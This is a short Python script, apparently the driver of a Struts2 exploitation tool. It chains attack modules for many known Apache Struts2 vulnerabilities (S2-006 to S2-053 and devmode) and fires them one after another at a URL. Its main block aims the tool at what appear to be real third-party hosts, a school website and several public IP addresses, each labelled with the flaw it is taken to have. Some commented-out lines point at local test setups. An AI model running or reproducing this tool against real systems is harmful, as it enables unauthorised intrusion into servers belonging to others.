from core.struts2_006 import struts2_006
from core.struts2_009 import struts2_009
from core.struts2_013 import struts2_013
from core.struts2_016 import struts2_016
from core.struts2_016_multipart_formdata__special import struts2_016_multipart_formdata__special
from core.struts2_019 import struts2_019
from core.struts2_032 import struts2_032
from core.struts2_045 import struts2_045
from core.struts2_052 import struts2_052
from core.struts2_053 import struts2_053
from core.struts2_devmode import struts2_devmode

def attack_all(url):
    ret = struts2_052(url).attack() or struts2_006(url).attack() or struts2_009(url).attack() or struts2_013(url).attack() or struts2_016(url).attack() or \
          struts2_016_multipart_formdata__special(url).attack() or struts2_019(url).attack() or struts2_032(url).attack() or \
          struts2_045(url).attack() or struts2_053(url).attack() or struts2_devmode(url).attack()
    return ret

if __name__ == '__main__':
    url = r'http://school.szpxe.com/perfect_edit.do'                       #045
    #url = r'http://127.0.0.1:8080/struts2-rest-showcase/orders/3'          #052
    #url = r'http://127.0.0.1:8080/s2-053'                                  #053
    #url = r'http://218.92.101.238:8088/cmsgyx/manage/ns_toshouye.do'       #016
    #url = r'http://218.75.55.165:8080/szxy/sys_login/login_login.do'       #struts2_devmode
    print(attack_all(url))